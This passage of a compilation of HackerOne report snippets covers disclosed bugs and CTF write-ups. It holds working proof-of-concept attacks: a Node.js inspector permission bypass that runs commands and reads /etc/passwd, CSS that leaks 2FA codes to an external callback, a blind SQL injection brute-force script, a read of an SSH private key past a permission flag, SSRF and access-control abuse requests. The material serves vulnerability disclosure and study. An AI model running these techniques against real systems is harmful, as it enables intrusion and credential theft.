        self.wfile.write(b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEY+UcYlP8VzOBdyMGUpbVFMsAUxPjWK7OiqARu/t3wO1mSNJ/RE5eaNLz5+6zM2WllUVrYF3cDXqNxge4srScM/v887Lz8mAupAZoPunxHrSTWFHjbCBaGm80z8QyStG+GMM/iN+mu4FtQ+ckMfOA8T/9k3clK3HomQXunJe85a6MPDsgE5MvEm4MdBUKQpEaEbstmAWtQIR5KCMHyNDa9WVKQQI+TJwAMpVa3L+Lbx4TZd04Fl5uKmCYUfPfBvj1/209s1XDN2rAK3AKJjAEbPVuLcZrl9iAse0FgA6HvUtA+g21VLba5OASXU/ZsedRmzECefMu8RVKHPzaaiC+RQU+1ihgBnQig0MdaXz8PZLOCo/673Pg9nsqjNafeU7fGTJD95BkkDL/3OfIEBq+rMbOyxrU+k8H+QWeVCbvh2LWRxdy/xciOMkkdodm2eGg45kJNjoDeKJEp0YpQ9ha+PdsqQqENAbqFqmYheAy1KJcpbG+U6Uik4hVXHxTAu0= ledz@ledzs-MacBook-Pro.local")

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                str(self.path), str(self.headers), post_data.decode('utf-8'))

        self._set_response()
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.INFO)
    server_address = ('0.0.0.0', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')
# … truncated …
```

## 375. [#1962701](https://hackerone.com/reports/1962701)  -  Process-based permissions can be bypassed with the "inspector" module.
*high*

```javascript
const { Session } = require('node:inspector/promises');

const session = new Session();
session.connect();

(async ()=>{
	await session.post('Debugger.enable');
	await session.post('Runtime.enable');

	global.Worker = require('node:worker_threads').Worker;
	
	let {result:{ objectId }} = await session.post('Runtime.evaluate', { expression: 'Worker' });
	let { internalProperties } = await session.post("Runtime.getProperties", { objectId: objectId });
	let {value:{value:{ scriptId }}} = internalProperties.filter(prop => prop.name == '[[FunctionLocation]]')[0];
	let { scriptSource } = await session.post("Debugger.getScriptSource", { scriptId });

	// find the line number where WorkerImpl is called. 
	const lineNumber = scriptSource.substring(0, scriptSource.indexOf("new WorkerImpl")).split('\n').length;

	// WorkerImpl will bypass permission for internal modules. We can inject the local var "isInternal = true" with a conditional breakpoint.
	await session.post("Debugger.setBreakpointByUrl", {
		lineNumber: lineNumber,
		url: "node:internal/worker",
		columnNumber: 0,
		condition: "((isInternal = true),false)"
	});

	new Worker(`
		const child_process = require("node:child_process");
		console.log(child_process.execSync("ls -l").toString());
		
		console.log(require("fs").readFileSync("/etc/passwd").toString())
	`, {
		eval: true,
		execArgv: [
# … truncated …
```

## 376. [#824802](https://hackerone.com/reports/824802)  -  URN Request bypass ACL Checks
*critical*

```
python -m http.server --bind 127.0.0.1 8080
```

## 377. [#895798](https://hackerone.com/reports/895798)  -  [H1-2006 2020] Bounty Pay CTF challenge
*critical*

```sh
$ adb install BountyPay.apk
Performing Streamed Install
Success
```

## 378. [#895798](https://hackerone.com/reports/895798)  -  [H1-2006 2020] Bounty Pay CTF challenge
*critical*

```sh
$ jadx-gui BountyPay.apk
```

## 379. [#895798](https://hackerone.com/reports/895798)  -  [H1-2006 2020] Bounty Pay CTF challenge
*critical*

```
Joining the dots I could reach some conclusions: 
If I change the avatar value of my account to: `tab4%20upgradeToAdmin` and report a page which contains my avatar and imports that js and contain `#tab4` at the end of the location, I could upgrade my account to Admin. 
But I had a big problem, I needed an input which name was equal to username and with the value was equal to 'sandra.allison'. 
So, I decided to search between my burp history and I found an only ocurrence: the login. But unfortunatelly, that template didn't import the js that I needed. 
I got stuck a couple of days in this step, I searched for each CVE associated with the Bootstrap Version, some cases of HPP, searched some way to inject an iframe anywhere but nothing worked. 
Until one day, I sat at the computer, ready to try again all the cases that I had already tried before, and after a few hours... a HPP's payload that I didn't try finally worked!!!
**#TryHarder**

`https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4` 

{F863539}

I only needed to intercept one report request, replace the url value with my enconding URL there, and send the request :) 

{F863547}

Note: `aHR0cHM6Ly9zdGFmZi5ib3VudHlwYXkuaDFjdGYuY29tLz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ=` is the base64 value of my payload. I encoded the injection because the endpoint works in this way.

{F863548}

Now I was so close to end the challenge, and I felt it. *brian.oliver* was the test account that I used in *https://app.bountypay.h1ctf.com/* so, those were the Marten Mickos credentials.

After logged into the Marten account with the same way as before, I started the payment process...

{F863549}

But wild 2Fa appeared :/

{F863550}

I tried to bypass in the same way but of course, it didn't work.
So, after a few minutes analizing the situation I discovered that the request send as a parameter a css resource:
# … truncated …
```

## 380. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```bash
$ amass enum --passive -d bountypay.h1ctf.com
```

## 381. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```bash
$ adb push cacert.cer /mnt/sdcard
```

## 382. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```bash
$ adb shell am start -W -a android.intent.action.VIEW -d "one://part/?start=PartTwoActivity" bounty.pay
Starting: Intent { act=android.intent.action.VIEW dat=one://part/?start=PartTwoActivity pkg=bounty.pay }
Status: ok
Activity: bounty.pay/.PartOneActivity
ThisTime: 883
TotalTime: 883
WaitTime: 893
Complete
```

## 383. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```bash
$ adb shell am start -W -a android.intent.action.VIEW -d "two://part/?two=light&switch=on" bounty.pay
/system/bin/sh: bounty.pay: not found
Starting: Intent { act=android.intent.action.VIEW dat=two://part/?two=light }
Status: ok
Activity: bounty.pay/.PartTwoActivity
ThisTime: 368
TotalTime: 368
WaitTime: 384
Complete
```

## 384. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```bash
$ adb shell am start -W -a android.intent.action.VIEW -d "two://part/?two=light\&switch=on" bounty.pay
Starting: Intent { act=android.intent.action.VIEW dat=two://part/?two=light&switch=on pkg=bounty.pay }
Status: ok
Activity: bounty.pay/.PartTwoActivity
ThisTime: 241
TotalTime: 241
WaitTime: 258
Complete
```

## 385. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```bash
$ adb shell am start -W -a android.intent.action.VIEW -d "three://part/?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token" bounty.pay
Starting: Intent { act=android.intent.action.VIEW dat=three://part/?three=UGFydFRocmVlQWN0aXZpdHk=&switch=b24=&header=X-Token pkg=bounty.pay }
Status: ok
Activity: bounty.pay/.PartThreeActivity
ThisTime: 224
TotalTime: 224
WaitTime: 253
Complete
```

## 386. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYkJqRURhdXczckZGTWlCSGtVR3lDU3FycUZGUjY0QXNHOWlLbi9xY0pkUFIxdnFpV1B4V3JmY3JhT3ZqQ1ZFVlpnYzMzaFAxMllyUzE3UT09; expires=Mon, 06-Jul-2020 23:09:22 GMT; Max-Age=2592000; path=/

["Report received"]
```

## 387. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```python
@blueprint.route('/uni_2fa_style.css')
def uni_2fa_style_css():
    session = request.args.get('session', uuid4().hex[:5])

    def selector(pos, char):
        name = escape_css_selector(f'code_{pos + 1}')
        value = escape_css_selector(char)
        callback = url_for(".h1_2006_callback", session=session, pos=pos, char=char, _external=True, _scheme='https')
        return f'input[name="{name}"][value="{value}"]{{background-image: url({callback});}}'

    selectors = [selector(pos, char) for pos in range(NUM_CHARS) for char in ALLOWED_CHARS]

    css = '\n'.join(selectors + [original_css])

    return Response(css, mimetype='text/css')
```

## 388. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 04:10:41 GMT
Content-Type: application/json
Connection: close
Content-Length: 33

{"error": "You are not logged in"}
```

## 389. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
+ In my chrome browser, I already got the "edit this cookie" extension and I changed with the above newly base64 encoded cookie parameter.

{F1139372}

+ After changing the cookie, I refreshed the page and thus, got the zip file download option as "my_secure_files_not_for_you.zip".

{F1139375}

+ After downloading and when I open the file, it was password protected.

{F1139378}

+ Afterwards, I installed one tool on the mac which is best for cracking the zip file - "Fcrackzip".
http://macappstore.org/fcrackzip/

+ For password wordlist, I got Seclist common 100k passwords - https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt.

+ Run the command as `fcrackzip -D -p /Users/kunalpandey/Desktop/pass.txt -u /Users/kunalpandey/Desktop/my_secure_files_not_for_you.zip`

{F1139391}

+ After bruteforcing, I got the result within one second which is "hahahaha" as password. Typed in the password on the zip file, extracted it successfully, and got another flag. There was also a grinch pic along with it.

{F1139393}

+ Inside the flag.txt file, it was stored as `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}` and finally, ctf level 5 was over.

+ Flag 5 - `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`.


**Day 6 - Flag 6**

+ On day 6, the new CTF level was added as `/my-diary` inside `/apps ` path on https://hackyholidays.h1ctf.com.

{F1139404}
# … truncated …
```

## 390. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 14:51:29 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token=16e3f0dd617d5ce9dbdba2c5a1f11b2d; expires=Thu, 31-Dec-2020 15:51:29 GMT; Max-Age=3600
Location: /signup-manager/
Content-Length: 0
```

## 391. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
+ Thus, we can't visit directly, this must be a case of an SSRF based exploit but need to find the right parameter.

+ In the image parameter for album such as https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=59grop

Image was loaded with base64 encoded parameter:

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9

{F1139675}


+ Decoding the base64 parameter gives the output as:

{"image":"r3c0n_server_4fdk59\/uploads\/32febb19572b12435a6a390c08e8d3da.jpg","auth":"76ba061d356c6264a6005216e1776ba6"}

+ So, I thought to insert api path for ssrf exploit inside the image , so tried the payload as:
```

## 392. [#953083](https://hackerone.com/reports/953083)  -  Ability to publish a paid theme without purchasing it.
*low, $2,000*

```
fetch("https://yourshop.myshopify.com/admin/online-store/admin/api/unversioned/graphql", {
      "headers": {
        "accept": "application/json",
        "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "pragma": "no-cache",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-online-store-web": "1"
      },
      "referrerPolicy": "no-referrer",
      "body": "{\"operationName\":\"ThemePublishLegacy\",\"variables\":{\"id\":\"gid://shopify/OnlineStoreTheme/[THEME_ID]\"},\"query\":\"mutation     ThemePublishLegacy($id: ID!) {\\n  onlineStoreThemePublish(id: $id) {\\n    theme {\\n      id\\n      __typename\\n    }\\n    userErrors {\\n      field\\n          message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    });
```

## 393. [#1044869](https://hackerone.com/reports/1044869)  -  Staff with no permissions could possibly list and accept billing promotions
*low, $600*

```javascript
fetch("https://{shop}.myshopify.com/admin/internal/web/graphql/core", {
	  "headers": {
		"accept": "application/json",
		"accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
		"content-type": "application/json",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-origin",
		"x-csrf-token": "{csrf-token}",
		"x-shopify-web-force-proxy": "1"
	  },
	  "referrerPolicy": "no-referrer",
	  "body": "{\"operationName\": \"Promotions\",\"query\": \"query Promotions {\\n shop {\\n  id\\n  applicablePromotions {\\n   id\\n   amount {\\n    amount\\n    currencyCode\\n    __typename\\n   }\\n   endAt\\n   description\\n   creditCategory\\n   promotionType\\n   __typename\\n  }\\n  __typename\\n }\\n}\"}",
	  "method": "POST",
	  "mode": "cors",
	  "credentials": "include"
	});
```

## 394. [#1044869](https://hackerone.com/reports/1044869)  -  Staff with no permissions could possibly list and accept billing promotions
*low, $600*

```javascript
fetch("https://{shop}.myshopify.com/admin/internal/web/graphql/core", {
	  "headers": {
		"accept": "application/json",
		"accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
		"content-type": "application/json",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-origin",
		"x-csrf-token": "{csrf-token}",,
		"x-shopify-web-force-proxy": "1"
	  },
	  "referrerPolicy": "no-referrer",
	  "body": "{\"operationName\": \"applicablePromotionAccept\",\"variables\": { \"id\": \"gid://shopify/ApplicablePromotion/{promotion_id}\"},\"query\": \"mutation applicablePromotionAccept($id: ID!) {\\n applicablePromotionAccept(id: $id) {\\n  userErrors {\\n   field\\n   message\\n   __typename\\n  }\\n  __typename\\n }\\n}\"}",
	  "method": "POST",
	  "mode": "cors",
	  "credentials": "include"
	});
```

## 395. [#3543475](https://hackerone.com/reports/3543475)  -  Improper Access Control in `fizzy.do` import flow allows cross-tenant ActionText reference resolution and data disclosure
*low, $218*

```bash
bundle exec ruby security-poc/integration_test_standalone.rb
```

## 396. [#1087744](https://hackerone.com/reports/1087744)  -  Improper deep link validation
*low*

```
am start -W -a android.intent.action.VIEW -d "https://ravel17.myshopify.com/admin/collections/../../
```

## 397. [#1087744](https://hackerone.com/reports/1087744)  -  Improper deep link validation
*low*

```
am start -W -a android.intent.action.VIEW -d "https://TARGET-STORE.myshopify.com/admin/collections/.../oauth/install_custom_app?client_id=....
```

## 398. [#1861974](https://hackerone.com/reports/1861974)  -  Stealing Users OAuth authorization code via redirect_uri
*high, $2,000*

```
https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9&redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback&response_type=code&scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile&state=%3A1a38b53563599621ce25094661b1c4458ddb52d79d771149
```

## 399. [#3401612](https://hackerone.com/reports/3401612)  -  IDOR Vulnerability in Banner Deletion
*high*

```
http://localhost:8080/www/admin/campaign-banners.php?clientid=100&campaignid=100
```

## 400. [#3401612](https://hackerone.com/reports/3401612)  -  IDOR Vulnerability in Banner Deletion
*high*

```
http://localhost:8080/www/admin/banner-delete.php?token=<YOUR_TOKEN>&clientid=100&campaignid=100&bannerid=2001
```

## 401. [#1486310](https://hackerone.com/reports/1486310)  -  admin.8x8.vc: Member users with no permission can integrate email to connect calendar via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?..
*high*

```json
{"url":"https://app.cronofy.com/oauth/authorize?response_type=code&client_id=M0wBDPDXk6EQLaGCqp-pTN_VGt7_AtM9&redirect_uri=https://api-vo.jitsi.net/rosy/sso/cronofy/callback&scope=read_only&delegated_scope=read_only&state=███████&avoid_linking=true"}
```

## 402. [#858671](https://hackerone.com/reports/858671)  -  Insufficient Type Check on GraphQL leading to Maintainer delete repository
*high*

```ruby
def find_object(id:)
        GitlabSchema.object_from_id(id)
      end

      def authorized_resource?(snippet)
        Ability.allowed?(context[:current_user], ability_for(snippet), snippet)
      end

      def ability_for(snippet)
        "#{ability_name}_#{snippet.to_ability_name}".to_sym
      end
```

## 403. [#1067912](https://hackerone.com/reports/1067912)  -  A Visit from The Grinch ~ 'Twas the night before Hackmas...
*critical*

```python
import requests

url1 = 'https://hackyholidays.h1ctf.com/evil-quiz' #POST
url2 = 'https://hackyholidays.h1ctf.com/evil-quiz/score' #GET

#threshold = 1953 # create an dict with thresold values, if we have two values

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~`!@#$%^*()-_=+[{]}\|;:,/?"

s = requests.Session()
cookie_obj = requests.cookies.create_cookie(domain='hackyholidays.h1ctf.com',name='session',value='f0dd61e4a671f34f123e36e0b8f2727c')
s.cookies.set_cookie(cookie_obj)
pos = 1
threshold = 0
out = ''
while True:
	found = 0
	for c in alphabet:
		
		# blind sqli brute force 1: find a table
		# select table_name from information_schema.tables where table_schema=database() limit 1
		# discovered table named 'admin'
		
		# blind sqli brute force 2: find columns in admin table 
		# select column_name from information_schema.columns where table_name='admin'
		# discovered columns id, password, username in table 'admin'
		
		# blind sqli brute force 3: find username in admin table
		# select username from admin where id='1'
		# discovered username 'admin'
		
		# blind sqli brute force 4: find password in admin table
		# select password from admin where username='admin'
		# discovered password 'S3creT_p4ssw0rd-$'
		
# … truncated …
```

## 404. [#1685822](https://hackerone.com/reports/1685822)  -  RepositoryPipeline allows importing of local git repos
*medium, $22,300*

```ruby
def load(context, data)
          url = data['httpUrlToRepo']
          return unless url.present?

          url = url.sub("://", "://oauth2:#{context.configuration.access_token}@")
          project = context.portable

          Gitlab::UrlBlocker.validate!(url, allow_local_network: allow_local_requests?, allow_localhost: allow_local_requests?)

          project.ensure_repository
          project.repository.fetch_as_mirror(url)
        end
```

## 405. [#1751258](https://hackerone.com/reports/1751258)  -  Attacker is able to create,Edit & delete notes and leak the title of a victim's private personal snippet
*medium, $1,730*

```ruby
def noteables_for_type(noteable_type)
    case noteable_type
    when "issue"
      IssuesFinder.new(@current_user, project_id: @project.id).execute # rubocop: disable CodeReuse/Finder
    when "merge_request"
      MergeRequestsFinder.new(@current_user, project_id: @project.id).execute # rubocop: disable CodeReuse/Finder
    when "snippet", "project_snippet"
      SnippetsFinder.new(@current_user, project: @project).execute # rubocop: disable CodeReuse/Finder
    when "personal_snippet"
      PersonalSnippet.all
    else
      raise "invalid target_type '#{noteable_type}'"
    end
  end
```

## 406. [#514897](https://hackerone.com/reports/514897)  -  Possible to enumerate Addresses of users using AddressId and guessing the delivery_subzone
*medium, $1,500*

```
:method: GET
:path: /mumbai/order-food-online?delivery_subzone=10159
:authority: www.zomato.com
:scheme: https
user-agent: Mozilla/5.0 (Windows NT 6.3; rv:46.0) Gecko/20100101 Firefox/46.0
accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
accept-language: en-US,en;q=0.5
accept-encoding: gzip, deflate, br
referer: https://www.zomato.com
cookie: selectedAddressId=████████
```

## 407. [#497047](https://hackerone.com/reports/497047)  -  Blocked user Git access through CI/CD token
*medium, $1,500*

```bash
$ mkdir /etc/systemd/system/gitlab-runner.service.d
$ vim /etc/systemd/system/gitlab-runner.service.d/http-proxy.conf   
        #Add the following content
	[Service]
	Environment="HTTP_PROXY=http://192.168.0.9:8080/"
$ :wq
$ systemctl daemon-reload
$ systemctl restart gitlab-runner
```

## 408. [#497047](https://hackerone.com/reports/497047)  -  Blocked user Git access through CI/CD token
*medium, $1,500*

```bash
$ su gitlab-runner
$ git config --global http.proxy http://192.168.0.9:8080
$ exit
```

## 409. [#497047](https://hackerone.com/reports/497047)  -  Blocked user Git access through CI/CD token
*medium, $1,500*

```bash
$ apt-get install tinyproxy
$ vim /etc/tinyproxy/tinyproxy.conf
	#Add the following content
	Port 1234    #changed from default
	AddHeader Authorization: Basic Z2l0bGFiLWNpLXRva2VuOlVwbnllR2plRlo4cV95UnptV1Fx
$ :wq
$ systemctl enable tinyproxy
$ systemctl start tinyproxy
```

## 410. [#497047](https://hackerone.com/reports/497047)  -  Blocked user Git access through CI/CD token
*medium, $1,500*

```bash
$ git config --global http.proxy http://127.0.0.1:1234
```

## 411. [#2434819](https://hackerone.com/reports/2434819)  -  Improper handling of wildcards in --allow-fs-read and --allow-fs-write
*medium, $1,290*

```bash
$ node --experimental-permission \
           --allow-fs-read=/home/tniessen/.ssh/*.pub \
           -p "fs.readFileSync('/home/tniessen/.ssh/id_github').length"
    464
```

## 412. [#2434819](https://hackerone.com/reports/2434819)  -  Improper handling of wildcards in --allow-fs-read and --allow-fs-write
*medium, $1,290*

```bash
$ node --experimental-permission \
           --allow-fs-read=/etc/passwd.* \
           -p 'fs.readFileSync("/etc/passwd")'
   <Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 6e 6f 62 6f 64 79 3a 78 3a 36 35 35 33 34 3a 36 35 35 33 34 3a 4e ... 2103 more bytes>
```

## 413. [#1011767](https://hackerone.com/reports/1011767)  -  X-Forward-For Header allows to bypass access restrictions
*medium*

```
HTTP/1.1 200 OK
Connection: close
server: openresty/1.13.6.2
content-type: application/json
x-b3-sampled: 0
x-is-internal-ip-address: true
x-zipkin-id: 2fce61c10ade1e32
x-routing-service: routing-main--useast1-d84b86b87-cwstn; site=biz_app
x-mode: ro
x-proxied: 10-65-64-83-useast1aprod
x-extlb: 10-65-64-83-useast1aprod
Accept-Ranges: bytes
Date: Mon, 19 Oct 2020 12:21:19 GMT
Via: 1.1 varnish
X-Served-By: cache-hhn4033-HHN
X-Cache: MISS
X-Cache-Hits: 0
Content-Length: 573093
```

## 414. [#1850407](https://hackerone.com/reports/1850407)  -  Chat room member disclosure via autocomplete API
*medium*

```
let req = new XMLHttpRequest();
req.open("GET", OC.generateUrl('/ocs/v2.php/core/autocomplete/get?search=demo&itemType=call&itemId=qqads88a&shareTypes[]=0&shareTypes[]=1&shareTypes[]=7&shareTypes[]=4'))
req.setRequestHeader('requesttoken',OC.requestToken)
req.send();
```

## 415. [#1850407](https://hackerone.com/reports/1850407)  -  Chat room member disclosure via autocomplete API
*medium*

```xml
<?xml version="1.0"?>
<ocs>
 <meta
  <status>ok</status>
  <statuscode>200</statuscode>
  <message>OK</message
 </meta>
 <data/>
</ocs>
```

## 416. [#1850407](https://hackerone.com/reports/1850407)  -  Chat room member disclosure via autocomplete API
*medium*

```xml
<?xml version="1.0"?>
<ocs>
 <meta>
  <status>ok</status>
  <statuscode>200</statuscode>.
  <message>OK</message
 </meta>
 <data>
  <element>
   <id>demo1</id>
   <label>demo1</label>
   <icon>icon-user</icon>
   <source>users</source>
   <status/>
   <subline></subline>
   <shareWithDisplayNameUnique>demo1</shareWithDisplayNameUnique>
  </element>
 </data>
</ocs>
```

## 417. [#2051224](https://hackerone.com/reports/2051224)  -  fs.statfs bypasses Permission Model
*low*

```bash
$ node --experimental-permission --allow-fs-read=/path/to/index.js
(node:756097) ExperimentalWarning: Permission is an experimental feature
(Use `node --trace-warnings ...` to show where the warning was created)
stats StatFs {
  type: 61267,
  bsize: 4096,
  blocks: 56377128,
  bfree: 27380986,
  bavail: 24498982,
  files: 14393344,
  ffree: 12478020
}
```

## 418. [#710006](https://hackerone.com/reports/710006)  -  Elasticsearch leaks data through the notes scope
*medium*

```
19:55:18 in ~ 
➜ curl "https://gitlab.com/api/v4/projects/278964/search?scope=notes&search=nextbit" --header "PRIVATE-TOKEN: TEST" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   520  100   520    0     0    508      0  0:00:01  0:00:01 --:--:--   508
[
  {
    "id": 215547575,
    "type": null,
    "body": "mentioned in issue nextbit/VirtualCore/gui#109",
    "attachment": null,
    "author": {
      "id": 16048,
      "name": "Riccardo Padovani",
      "username": "rpadovani",
      "state": "active",
      "avatar_url": "https://secure.gravatar.com/avatar/9d89d4072afb4457b0c49131d8d258f5?s=80&d=identicon",
      "web_url": "https://gitlab.com/rpadovani"
    },
    "created_at": "2019-02-19T12:54:23.670Z",
    "updated_at": "2019-02-19T12:54:23.670Z",
    "system": true,
    "noteable_id": 24685040,
    "noteable_type": "Issue",
    "resolvable": false,
    "noteable_iid": 25362
  }
]
```
